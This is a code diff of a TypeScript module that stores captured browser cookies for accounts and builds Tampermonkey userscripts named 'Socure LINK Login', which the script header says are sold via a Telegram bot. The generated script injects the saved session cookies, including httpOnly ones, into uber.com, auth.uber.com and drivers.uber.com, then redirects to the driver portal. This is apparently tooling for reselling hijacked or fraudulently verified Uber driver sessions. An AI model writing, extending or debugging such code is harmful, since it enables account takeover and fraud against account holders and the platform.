@@ -15,7 +15,6 @@ import type { Cookie } from 'playwright';
 const DATA_DIR  = path.resolve(process.cwd(), 'data');
 const DATA_FILE = path.join(DATA_DIR, 'accounts.json');
 
-/** MELHORIA 11: limite máximo de contas salvas para evitar crescimento ilimitado do JSON */
 const MAX_ACCOUNTS = 200;
 
 function readAll(): Account[] {
@@ -33,11 +32,6 @@ function writeAll(accounts: Account[]): void {
   fs.writeFileSync(DATA_FILE, JSON.stringify(accounts, null, 2), 'utf-8');
 }
 
-/**
- * Gera o userscript Tampermonkey para injetar os cookies salvos.
- * Formato de cada cookie no array C:
- *   [name, value, domain, secure(0|1), httpOnly(0|1), expiresMs(-1 = sessão)]
- */
 export function buildTampermonkeyScript(cookies: Cookie[]): string {
   const ALLOWED_DOMAINS = [
     'uber.com',
@@ -70,13 +64,18 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
 
   const cArray = `[${rows.join(',')}]`;
 
+  // @match explícito para cada subdomínio — *.uber.com não pega subdomínios em todos os gerenciadores
   const header = [
     '// ==UserScript==',
     '// @name         Socure LINK Login',
     '// @namespace    User Name',
-    '// @version      3.0',
+    '// @version      3.1',
     '// @description  Vendido por @ddbicos_bot',
+    '// @match        https://uber.com/*',
     '// @match        https://*.uber.com/*',
+    '// @match        https://auth.uber.com/*',
+    '// @match        https://drivers.uber.com/*',
+    '// @match        https://bonjour.uber.com/*',
     '// @grant        GM_cookie',
     '// @run-at       document-start',
     '// ==/UserScript==',
@@ -86,33 +85,38 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
   /* eslint-disable no-undef */
   const body =
     `(function(){` +
-    `var H=window.location.hostname,C=${cArray};` +
+    `var H=window.location.hostname;` +
+    `console.log('[SocureLink] rodando em',H);` +  // debug: confirma que script rodou
+    `var C=${cArray};` +
     `var ok=function(d){d=d.replace(/^[.]/,'');return H===d||H.endsWith('.'+d)};` +
     `var EX=Date.now()+3154e7;` +
     `var RAN='__scr_done';` +
-    // Destino final: auth.uber.com com redirect para drivers após login
-    `var TARGET='https://auth.uber.com/login/?next_url=https%3A%2F%2Fdrivers.uber.com%2F&uber_client_name=d1e&resume=https%3A%2F%2Fdrivers.uber.com%2F';` +
     `var doRedirect=function(){` +
-      // Só age uma vez por sessão e apenas quando NÃO estamos já no auth ou drivers logados
-    `if(sessionStorage.getItem(RAN))return;` +
+      `if(sessionStorage.getItem(RAN))return;` +
       `sessionStorage.setItem(RAN,'1');` +
-      // Se já estamos no auth.uber.com, apenas recarrega para ele ler os novos cookies
-    `if(H==='auth.uber.com'){location.reload();return;}` +
-      // Se já estamos em drivers.uber.com não faz nada
-    `if(H==='drivers.uber.com'){return;}` +
-      // Caso contrário navega para o auth com next_url para drivers
-    `location.href=TARGET;` +
+      `console.log('[SocureLink] doRedirect chamado, H=',H);` +
+      // Em auth.uber.com: navega direto para drivers (o auth já tem os cookies, deixa ele resolver)
+      `if(H==='auth.uber.com'){` +
+        `console.log('[SocureLink] em auth, indo para drivers...');` +
+        `location.href='https://drivers.uber.com/';` +
+        `return;` +
+      `}` +
+      `if(H==='drivers.uber.com'){console.log('[SocureLink] já em drivers, ok.');return;}` +
+      `location.href='https://auth.uber.com/';` +
     `};` +
     `if(typeof GM_cookie!='undefined'){` +
+      `console.log('[SocureLink] GM_cookie disponível, injetando',C.length,'cookies...');` +
       `var total=C.length,done=0;` +
       `C.forEach(function(c){` +
         `var n=c[0],v=c[1],d=c[2],s=c[3],h=c[4],e=c[5]>0?c[5]:EX;` +
         `if(!h&&ok(d)){var ck=n+'='+v+';path=/;expires='+new Date(e).toUTCString()+(s?';secure':'')+'';try{document.cookie=ck;}catch(x){}}` +
         `GM_cookie.set({name:n,value:v,domain:d.replace(/^[.]/,''),path:'/',secure:!!s,httpOnly:!!h,expirationDate:Math.floor(e/1000)},function(){` +
-          `done++;if(done>=total)doRedirect();` +
+          `done++;` +
+          `if(done>=total){console.log('[SocureLink] todos cookies setados, redirecionando...');doRedirect();}` +
         `});` +
       `});` +
     `}else{` +
+      `console.log('[SocureLink] GM_cookie INDISPONIVEL, usando document.cookie apenas');` +
       `C.forEach(function(c){` +
         `var n=c[0],v=c[1],d=c[2],s=c[3],h=c[4],e=c[5]>0?c[5]:EX;` +
         `if(!h&&ok(d)){var ck=n+'='+v+';path=/;expires='+new Date(e).toUTCString()+(s?';secure':'')+'';try{document.cookie=ck;}catch(x){}}` +
@@ -125,7 +129,6 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
   return `${header}\n${body}\n`;
 }
 
-/** Salva uma nova conta. Retorna o registro com id gerado. */
 export function save(data: Omit<Account, 'id' | 'createdAt'>): Account {
   const account: Account = {
     id: randomUUID(),
@@ -139,12 +142,10 @@ export function save(data: Omit<Account, 'id' | 'createdAt'>): Account {
   return account;
 }
 
-/** Lista todas as contas, da mais recente para a mais antiga. */
 export function list(): Account[] {
   return readAll();
 }
 
-/** Remove uma conta pelo id. */
 export function remove(id: string): boolean {
   const all = readAll();
   const next = all.filter((a) => a.id !== id);
@@ -153,11 +154,6 @@ export function remove(id: string): boolean {
   return true;
 }
 
-/**
- * MELHORIA 10: regenera o script Tampermonkey de uma conta existente.
- * Útil quando os cookies expiraram e foram atualizados externamente.
- * Retorna a conta atualizada ou null se não encontrada.
- */
 export function regenScript(id: string): Account | null {
   const all = readAll();
   const idx = all.findIndex((a) => a.id === id);
